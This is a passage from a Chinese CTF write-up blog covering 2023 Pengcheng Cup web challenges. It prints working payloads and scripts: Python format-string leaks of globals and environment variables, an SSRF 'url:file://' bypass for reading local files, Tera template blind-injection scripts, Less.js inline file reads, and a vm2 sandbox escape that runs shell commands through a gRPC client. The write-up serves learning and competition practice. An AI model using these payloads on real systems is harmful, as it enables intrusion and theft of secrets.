class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span>            .<span class="hljs-built_in">format</span>(user=username)            .<span class="hljs-built_in">format</span>(passhash=new_pwd)            )<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">10000</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs asciidoc">username=&#123;passhash.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>&#125;&amp;password=2username=&#123;passhash.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>&#125;&amp;password=2username=&#123;passhash.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__repr__</span>.<span class="hljs-emphasis">__globals__</span>&#125;&amp;password=2username=&#123;passhash.<span class="hljs-emphasis">__repr__</span>.<span class="hljs-emphasis">__globals__</span>&#125;&amp;password=2</code></pre></div><p>以上payload均能够获取<code>__globals__</code>的内容</p><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115175838102.png" alt="image-20240115175838102"></p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>通过<code>__globals__</code>获取到<code>passhash</code>，然后就可以根据大佬的说法</p><div class="code-wrapper"><pre><code class="hljs sqf">:&gt;<span class="hljs-number">0</span> 表示左对齐, 会调用父类 <span class="hljs-built_in">str</span> 的 <span class="hljs-variable">__format__</span> 方法, 而不是 <span class="hljs-variable">__str__</span> 和 <span class="hljs-variable">__repr__</span>, 进而得到明文</code></pre></div><div class="code-wrapper"><pre><code class="hljs asciidoc">username=&#123;passhash.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>[passhash]:&gt;0&#125;&amp;password=2</code></pre></div><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115180158358.png" alt="image-20240115180158358"></p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>也可以取数组下标一位一位弄出来</p><div class="code-wrapper"><pre><code class="hljs asciidoc">username=&#123;passhash.<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>[passhash][0]&#125;&amp;password=2</code></pre></div><div class="code-wrapper"><pre><code class="hljs asciidoc">import requestsurl = &quot;<span class="hljs-link">http://localhost:5000/?username=&#123;passhash.__class__.__str__.__globals__</span>[<span class="hljs-string">passhash</span>]&quot;for i in range(20):<span class="hljs-code">    req = requests.get(url+f&quot;[&#123;i&#125;]&quot;+&quot;&#125;&amp;password=2&quot;)</span><span class="hljs-code">    print(req.text)</span></code></pre></div><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115180758401.png" alt="image-20240115180758401"></p><p>这样就获取到了admin的密码</p><h3 id="获取环境变量"><a href="#获取环境变量" class="headerlink" title="获取环境变量"></a>获取环境变量</h3><p>登录</p><div class="code-wrapper"><pre><code class="hljs pgsql">/?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">3673940420288307</span></code></pre></div><p>提示 flag 在环境变量里面</p><p>于是通过 flask app 找到 os 模块, 然后读取 environ 属性</p><div class="code-wrapper"><pre><code class="hljs fallback">username=&#123;passhash.__str__.__globals__[app].__init__.__globals__[os].environ&#125;&amp;password=2</code></pre></div><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115181536992.png" alt="image-20240115181536992"></p><p>这个payload也可以</p><div class="code-wrapper"><pre><code class="hljs asciidoc">username=&#123;passhash.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>[app].wsgi_app.<span class="hljs-emphasis">__globals__</span>[os].environ&#125;&amp;password=1</code></pre></div><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>这没办法，要是做题肯定不会，只能看看WP了</p><p>扫描发现</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.10</span>.<span class="hljs-number">0.3</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/swagger-ui/i</span>ndex.html</code></pre></div><p>只有一个api，可以进行ssrf，先<a href="http://x.x.xx./%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%8F%91%E7%8E%B0user-agent%E4%B8%AD%E6%9C%89java%E7%89%88%E6%9C%AC%EF%BC%8C%E7%8C%9C%E6%B5%8B%E6%98%AF%E9%80%9A%E8%BF%87URL%E7%B1%BB%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%E3%80%82%E4%BD%BF%E7%94%A8ftp%E4%B9%9F%E8%83%BD%E6%AD%A3%E5%B8%B8%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BD%BF%E7%94%A8file%E7%9A%84%E6%97%B6%E5%80%99%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E8%B0%83%E8%AF%95URL%E7%B1%BB%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E7%9A%84%E7%82%B9">http://x.x.xx./到自己的云服务器，发现user-agent中有java版本，猜测是通过URL类发起请求。使用ftp也能正常获取内容，但是使用file的时候被过滤了，调试URL类，发现可以利用绕过的点</a></p><div class="code-wrapper"><pre><code class="hljs crmsh">if (<span class="hljs-keyword">spec</span>.regionMatches(<span class="hljs-literal">true</span>, <span class="hljs-literal">start</span>, <span class="hljs-string">&quot;url:&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>)) &#123;                <span class="hljs-literal">start</span> += <span class="hljs-number">4</span>;            &#125;</code></pre></div><p>在url以url:开头时，直接跳过，紧接着的是对#符号的处理</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">start</span> &lt; spec.length() &amp;&amp; spec.charAt(<span class="hljs-keyword">start</span>) == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;                <span class="hljs-comment">/* we&#x27;re assuming this is a ref relative to the context URL.</span><span class="hljs-comment">                 * This means protocols cannot start w/ &#x27;#&#x27;, but we must parse</span><span class="hljs-comment">                 * ref URL&#x27;s like: &quot;hello:there&quot; w/ a &#x27;:&#x27; in them.</span><span class="hljs-comment">                 */</span>                aRef=<span class="hljs-keyword">true</span>;            &#125;</code></pre></div><p>利用这个点可以绕过仅.html限制，读取flag</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.10</span>.<span class="hljs-number">0.3</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/proxy/u</span>rl?url=url:file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/flag%23a.html</span></code></pre></div><blockquote><p>&#x2F;proxy&#x2F;url 存在 ssrf, 过滤了 <code>file://</code> <code>netdoc://</code> 等协议</p><p>使用 <code>url:file://</code> 绕过, 再传一个 query string 绕过 <code>Only html can be viewed</code> 限制</p><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-regexp">/proxy/u</span>rl?url=url:<span class="hljs-keyword">file</span>:<span class="hljs-comment">///flag?html</span></code></pre></div></blockquote><h2 id="Tera"><a href="#Tera" class="headerlink" title="Tera"></a>Tera</h2><p>当时题目描述写了ssti，我就在bing上搜索<code>tera ssti</code>，结果啥都没有</p><p>赛后看lolita做出来了，问他是怎样信息搜集的，他说主要是看文档，（大佬都是这样呜呜呜）</p><p>他也说<code>tera ssti</code>，只是用的是chrome，我用chrome一搜，直接就找到相关文章了。。。。。。。</p><p>tera实际上是Rust的模板引擎</p><p><code>tera A powerful, fast and easy-to-use template engine for Rust</code></p><p>看了三个payload</p><p>有三个主要部分，绕过<code>flag</code>的过滤，利用get_env获取环境变量中的flag值，利用if语句对flag值进行盲注</p><p>区别就是具体实现不同</p><p>直接给出来吧，感觉没啥好说的，这种题还得是做到时具体看文档   </p><p><a href="https://keats.github.io/tera/docs/#built-ins">Tera (keats.github.io)</a></p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>不报错，说明环境变量中存在flag变量&#123;% set fla=[<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>]|join(sep=<span class="hljs-string">&quot;&quot;</span>) %&#125;&#123;% set fla1 = get_env(name=fla) %&#125;<span class="hljs-regexp">//</span>利用reverse反转字符串，然后在<span class="hljs-keyword">if</span>语句中使用starting_with，若正确回显ok，盲注出flagimport requestsflag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef-&#123;&#125;&quot;</span>:        postdata = <span class="hljs-string">&quot;&quot;&quot;&#123;% set f=&#x27;galf&#x27;|reverse %&#125;&#123;% set f1 = get_env(name=f)|reverse %&#125;&#123;% if f1 is starting_with(&#x27;&quot;&quot;&quot;</span> + flag + i + <span class="hljs-string">&quot;&quot;&quot;&#x27;) %&#125;ok&#123;% endif %&#125;&quot;&quot;&quot;</span>        res = requests.post(<span class="hljs-string">&quot;http://172.10.0.3:8081/&quot;</span>, postdata).text        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ok&quot;</span> <span class="hljs-keyword">in</span> res:            flag += i            print(flag)            <span class="hljs-keyword">break</span>                        反转一下套上flag标签即可<span class="hljs-regexp">//</span>。。。要反转的话get_env后面不加reverse不就行了吗</code></pre></div><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://172.10.0.3:8081/&quot;</span>headers = &#123;  <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>:    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">try</span>:            payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">&#123;% set AX = get_env(name=&quot;fl&quot;~&quot;ag&quot;, default=&quot;1&quot;) %&#125;    //~拼接flag</span><span class="hljs-string">&#123;%- for char in AX -%&#125;</span><span class="hljs-string">C                                    //计数</span><span class="hljs-string">&#123;%- if char == &#x27;LOLITA&#x27; -%&#125;          //在发包时进行替换</span><span class="hljs-string">h                                    //若正确回显h</span><span class="hljs-string">&#123;%- else -%&#125;</span><span class="hljs-string">&#123;%- endif -%&#125;</span><span class="hljs-string">&#123;% endfor %&#125;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>            response = requests.request(<span class="hljs-string">&quot;POST&quot;</span>, url, headers=headers, data=payload.replace(<span class="hljs-string">&quot;LOLITA&quot;</span>, i), timeout=(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))            <span class="hljs-comment">#print(response.text)</span>            rspt = response.text.strip()            <span class="hljs-built_in">print</span>(rspt)            cc = <span class="hljs-number">0</span>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rspt)):                <span class="hljs-keyword">if</span> rspt[x] == <span class="hljs-string">&#x27;C&#x27;</span>:                    cc += <span class="hljs-number">1</span>                <span class="hljs-keyword">if</span> rspt[x] == <span class="hljs-string">&#x27;h&#x27;</span>:                    flag[cc-<span class="hljs-number">1</span>] = i            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">except</span>:            <span class="hljs-number">1</span>-<span class="hljs-number">1</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsdicts = <span class="hljs-string">&#x27;0123456789abcdef-&#x27;</span><span class="hljs-comment"># flag = &#x27;&#123;3c8ce067-4df7-66b2-843a-04c6959&#x27;</span>flag = <span class="hljs-string">&#x27;-04c695904159&#125;&#x27;</span>i = <span class="hljs-number">1</span>//replace绕过flag的匹配，在<span class="hljs-keyword">if</span>语句中使用starting_with，若正确回显true，盲注出flag<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;testing&#x27;</span>, s)        url = <span class="hljs-string">&#x27;http://172.10.0.3:8081/&#x27;</span>        <span class="hljs-comment"># data = r&#x27;&#123;% set my_var = get_env(name=&quot;flac&quot;|replace(from=&quot;c&quot;, to=&quot;g&quot;)) %&#125;&#123;% if my_var is starting_with(&quot;AAAg&#x27; + flag + s + &#x27;&quot;|replace(from=&quot;AAA&quot;, to=&quot;fla&quot;)) %&#125;true&#123;% else %&#125;false&#123;% endif %&#125;&#x27;</span>        data = <span class="hljs-string">r&#x27;&#123;% set my_var = get_env(name=&quot;flac&quot;|replace(from=&quot;c&quot;, to=&quot;g&quot;)) %&#125;&#123;% if my_var is ending_with(&quot;&#x27;</span> + s + flag + <span class="hljs-string">&#x27;&quot;) %&#125;true&#123;% else %&#125;false&#123;% endif %&#125;&#x27;</span>        <span class="hljs-comment"># print(data)</span>        res = requests.post(url, data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;forbidden&#x27;</span> <span class="hljs-keyword">in</span> res.text:            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;forbidden&#x27;</span>)            exit()        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-keyword">in</span> res.text:            <span class="hljs-comment"># flag += s</span>            flag = s + flag            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;found!!!&#x27;</span>, flag)            <span class="hljs-keyword">break</span>    i += <span class="hljs-number">1</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs maxima">flag&#123;3c8ce067-4df7-<span class="hljs-number">66b2</span>-843a-<span class="hljs-number">04c695904159</span>&#125;</code></pre></div><h2 id="simple-rpc"><a href="#simple-rpc" class="headerlink" title="simple_rpc"></a>simple_rpc</h2><p>访问自动跳转</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.10.0.6:3000</span>/find_rpc?less=h5%<span class="hljs-number">7</span>Bcolor:red%<span class="hljs-number">7</span>D</code></pre></div><p>搜了一下<code>less=h5%7Bcolor:red%7D</code>好像是Less.js用于CSS扩展</p><p>提示要读取rpc.js，找官方文档，有@import可以用 <a href="https://less.bootcss.com/features/#import-at-rules-inline">https://less.bootcss.com/features/#import-at-rules-inline</a> 用inline选项可以原样导入文本，读取rpc.js和package.json</p><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115211141073.png" alt="image-20240115211141073"></p><div class="code-wrapper"><pre><code class="hljs fallback">/find_rpc?less=h5&#123;@import%20(inline)%20&#x27;rpc.js&#x27;;&#125;/find_rpc?less=h5&#123;@import%20(inline)%20&#x27;eval.proto&#x27;;&#125;/find_rpc?less=h5&#123;@import%20(inline)%20&#x27;app.js&#x27;;&#125;/find_rpc?less=h5&#123;@import%20(inline)%20&#x27;package.json&#x27;;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//rpc.js</span><span class="hljs-keyword">var</span> <span class="hljs-variable constant_">PROTO_PATH</span> = __dirname + <span class="hljs-string">&#x27;/eval.proto&#x27;</span>;<span class="hljs-keyword">const</span> &#123;<span class="hljs-variable constant_">VM</span>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<span class="hljs-keyword">var</span> grpc = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@grpc/grpc-js&#x27;</span>);<span class="hljs-keyword">var</span> protoLoader = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@grpc/proto-loader&#x27;</span>);<span class="hljs-keyword">var</span> packageDefinition = protoLoader.<span class="hljs-title function_">loadSync</span>(    <span class="hljs-variable constant_">PROTO_PATH</span>,    &#123;<span class="hljs-attr">keepCase</span>: <span class="hljs-literal">true</span>,        <span class="hljs-attr">longs</span>: <span class="hljs-title class_">String</span>,        <span class="hljs-attr">enums</span>: <span class="hljs-title class_">String</span>,        <span class="hljs-attr">defaults</span>: <span class="hljs-literal">true</span>,        <span class="hljs-attr">oneofs</span>: <span class="hljs-literal">true</span>    &#125;);<span class="hljs-keyword">var</span> hello_proto = grpc.<span class="hljs-title function_">loadPackageDefinition</span>(packageDefinition).<span class="hljs-property">helloworld</span>;<span class="hljs-keyword">function</span> <span class="hljs-title function_">evalTemplate</span>(<span class="hljs-params">call, callback</span>) &#123;    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>();    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, &#123;<span class="hljs-attr">message</span>:    vm.<span class="hljs-title function_">run</span>(call.<span class="hljs-property">request</span>.<span class="hljs-property">template</span>) &#125;);&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;    <span class="hljs-keyword">var</span> server = <span class="hljs-keyword">new</span> grpc.<span class="hljs-title class_">Server</span>();    server.<span class="hljs-title function_">addService</span>(hello_proto.<span class="hljs-property">Demo</span>.<span class="hljs-property">service</span>, &#123;<span class="hljs-attr">evalTemplate</span>: evalTemplate&#125;);    server.<span class="hljs-title function_">bindAsync</span>(<span class="hljs-string">&#x27;0.0.0.0:8082&#x27;</span>, grpc.<span class="hljs-property">ServerCredentials</span>.<span class="hljs-title function_">createInsecure</span>(), <span class="hljs-function">() =&gt;</span> &#123;        server.<span class="hljs-title function_">start</span>();    &#125;);&#125;<span class="hljs-title function_">main</span>()</code></pre></div><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115212744307.png" alt="image-20240115212744307"></p><div class="code-wrapper"><pre><code class="hljs protobuf"><span class="hljs-comment">//eval.proto</span>syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<span class="hljs-keyword">package</span> helloworld;<span class="hljs-keyword">service </span><span class="hljs-title class_">Demo</span> &#123;  <span class="hljs-function"><span class="hljs-keyword">rpc</span> evalTemplate (TemplateRequest) <span class="hljs-keyword">returns</span> (Reply) </span>&#123;&#125;&#125;<span class="hljs-keyword">message </span><span class="hljs-title class_">TemplateRequest</span> &#123;  <span class="hljs-type">string</span> template = <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">message </span><span class="hljs-title class_">Reply</span> &#123;  <span class="hljs-type">string</span> message = <span class="hljs-number">1</span>;&#125;</code></pre></div><p>就是一个简单的请求与响应</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;confuse&quot;</span>,  <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;1.0.0&quot;</span>,  <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,  <span class="hljs-string">&quot;main&quot;</span>: <span class="hljs-string">&quot;app.js&quot;</span>,  <span class="hljs-string">&quot;scripts&quot;</span>: &#123;    <span class="hljs-string">&quot;test&quot;</span>: <span class="hljs-string">&quot;node app.js&quot;</span>  &#125;,  <span class="hljs-string">&quot;author&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,  <span class="hljs-string">&quot;license&quot;</span>: <span class="hljs-string">&quot;ISC&quot;</span>,  <span class="hljs-string">&quot;dependencies&quot;</span>: &#123;    <span class="hljs-string">&quot;express&quot;</span>: <span class="hljs-string">&quot;^4.17.1&quot;</span>,    <span class="hljs-string">&quot;vm2&quot;</span>: <span class="hljs-string">&quot;3.9.15&quot;</span>,    <span class="hljs-string">&quot;acorn&quot;</span>: <span class="hljs-string">&quot;^8.8.2&quot;</span>,    <span class="hljs-string">&quot;@grpc/grpc-js&quot;</span>: <span class="hljs-string">&quot;^1.9.0&quot;</span>,    <span class="hljs-string">&quot;@grpc/proto-loader&quot;</span>: <span class="hljs-string">&quot;^0.7.8&quot;</span>,    <span class="hljs-string">&quot;less&quot;</span>: <span class="hljs-string">&quot;^4.2.0&quot;</span>  &#125;</code></pre></div><p>vm2该版本存在逃逸漏洞<a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p><div class="code-wrapper"><pre><code class="hljs coffeescript">const code = `<span class="language-javascript"></span><span class="language-javascript">err = &#123;&#125;;</span><span class="language-javascript"><span class="hljs-keyword">const</span> handler = &#123;</span><span class="language-javascript">    <span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-params">target</span>) &#123;</span><span class="language-javascript">        (<span class="hljs-keyword">function</span> <span class="hljs-title function_">stack</span>(<span class="hljs-params"></span>) &#123;</span><span class="language-javascript">            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>().<span class="hljs-property">stack</span>;</span><span class="language-javascript">            <span class="hljs-title function_">stack</span>();</span><span class="language-javascript">        &#125;)();</span><span class="language-javascript">    &#125;</span><span class="language-javascript">&#125;;</span><span class="language-javascript">  </span><span class="language-javascript"><span class="hljs-keyword">const</span> proxiedErr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(err, handler);</span><span class="language-javascript"><span class="hljs-keyword">try</span> &#123;</span><span class="language-javascript">    <span class="hljs-keyword">throw</span> proxiedErr;</span><span class="language-javascript">&#125; <span class="hljs-keyword">catch</span> (&#123;<span class="hljs-attr">constructor</span>: c&#125;) &#123;</span><span class="language-javascript">    c.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);</span><span class="language-javascript">&#125;</span><span class="language-javascript"></span>`</code></pre></div><p>所以我们构造grpc client去与服务端进行交互即可</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">grpc</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;@grpc/grpc-js&#x27;</span>);<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">protoLoader</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;@grpc/proto-loader&#x27;</span>);<span class="hljs-keyword">var</span> PROTO_PATH = __dirname + <span class="hljs-string">&#x27;/eval.proto&#x27;</span>;<span class="hljs-keyword">var</span> packageDefinition = protoLoader.<span class="hljs-title function_ invoke__">loadSync</span>(    PROTO_PATH,    &#123;        <span class="hljs-attr">keepCase</span>: <span class="hljs-literal">true</span>,        <span class="hljs-attr">longs</span>: String,        <span class="hljs-attr">enums</span>: String,        <span class="hljs-attr">defaults</span>: <span class="hljs-literal">true</span>,        <span class="hljs-attr">oneofs</span>: <span class="hljs-literal">true</span>    &#125;);<span class="hljs-keyword">var</span> hello_proto = grpc.<span class="hljs-title function_ invoke__">loadPackageDefinition</span>(packageDefinition).helloworld;<span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> hello_proto.<span class="hljs-title function_ invoke__">Demo</span>(<span class="hljs-string">&#x27;172.10.0.6:8082&#x27;</span>, grpc.credentials.<span class="hljs-title function_ invoke__">createInsecure</span>());<span class="hljs-keyword">var</span> template = `err = &#123;&#125;;<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">handler</span> = &#123;    <span class="hljs-title function_ invoke__">getPrototypeOf</span>(target) &#123;        (<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stack</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>().stack;            <span class="hljs-title function_ invoke__">stack</span>();        &#125;)();    &#125;&#125;;  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">proxiedErr</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(err, handler);<span class="hljs-keyword">try</span> &#123;    <span class="hljs-keyword">throw</span> proxiedErr;&#125; <span class="hljs-keyword">catch</span> (&#123;constructor: c&#125;) &#123;    c.<span class="hljs-title function_ invoke__">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>)().mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_ invoke__">execSync</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>();&#125;`;client.<span class="hljs-title function_ invoke__">evalTemplate</span>(&#123;<span class="hljs-attr">template</span>: template&#125;, function(err, response) &#123;    <span class="hljs-keyword">if</span> (err) &#123;        console.<span class="hljs-title function_ invoke__">error</span>(err);        <span class="hljs-keyword">return</span>;    &#125;    console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&#x27;服务端的运算结果: &#x27;</span>, response.message);&#125;);</code></pre></div><p>不会写没关系，找gpt生成一下就行</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> grpc = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@grpc/grpc-js&#x27;</span>);<span class="hljs-keyword">const</span> protoLoader = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@grpc/proto-loader&#x27;</span>);<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PROTO_PATH</span> = __dirname + <span class="hljs-string">&#x27;/eval.proto&#x27;</span>;<span class="hljs-keyword">const</span> packageDefinition = protoLoader.<span class="hljs-title function_">loadSync</span>(    <span class="hljs-variable constant_">PROTO_PATH</span>,    &#123; <span class="hljs-attr">keepCase</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">longs</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">enums</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">defaults</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">oneofs</span>: <span class="hljs-literal">true</span> &#125;);<span class="hljs-keyword">const</span> hello_proto = grpc.<span class="hljs-title function_">loadPackageDefinition</span>(packageDefinition).<span class="hljs-property">helloworld</span>;<span class="hljs-keyword">function</span> <span class="hljs-title function_">evalTemplate</span>(<span class="hljs-params">template</span>) &#123;    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> hello_proto.<span class="hljs-title class_">Demo</span>(<span class="hljs-string">&#x27;localhost:8082&#x27;</span>, grpc.<span class="hljs-property">credentials</span>.<span class="hljs-title function_">createInsecure</span>());    <span class="hljs-keyword">const</span> request = &#123; template &#125;;    client.evalTemplate(request, <span class="hljs-function">(<span class="hljs-params">error, response</span>) =&gt;</span> &#123;        <span class="hljs-keyword">if</span> (!error) &#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response:&#x27;</span>, response.<span class="hljs-property">message</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error);        &#125;    &#125;);&#125;<span class="hljs-comment">// Example usage:</span>evalTemplate(<span class="hljs-string">&#x27;Hello, &#123;&#123; name &#125;&#125;!&#x27;</span>);</code></pre></div><h3 id="看到TEL师傅的非预期"><a href="#看到TEL师傅的非预期" class="headerlink" title="看到TEL师傅的非预期"></a>看到TEL师傅的非预期</h3><p><a href="https://zhuanlan.zhihu.com/p/389345632">https://zhuanlan.zhihu.com/p/389345632</a></p><p>非预期吧？less.js rce</p><p>Vps 上放 1.js</p><p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240119004540337.png" alt="image-20240119004540337"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>题目考点总体来说都是那种需要现学现用的那种，但我很难看得懂官方文档</p><p>所以做题总做不出来，tera的那种看文档的话应该是属于最简单的那种了，很多方法都能用，不像别的难题在众多语句中找到要用的</p><p>唉，太难了</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://cn-sec.com/archives/2180731.html">2023第三届“鹏城杯”线上初赛WriteUp | CN-SEC 中文网</a></p><p><a href="https://exp10it.io/2023/11/2023-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/#simple_rpc">https://exp10it.io/2023/11/2023-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/#simple_rpc</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HECTF2023-web复现</title>
    <link href="/2024/01/14/HECTF2023-web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/01/14/HECTF2023-web%E5%A4%8D%E7%8E%B0/</url>
    
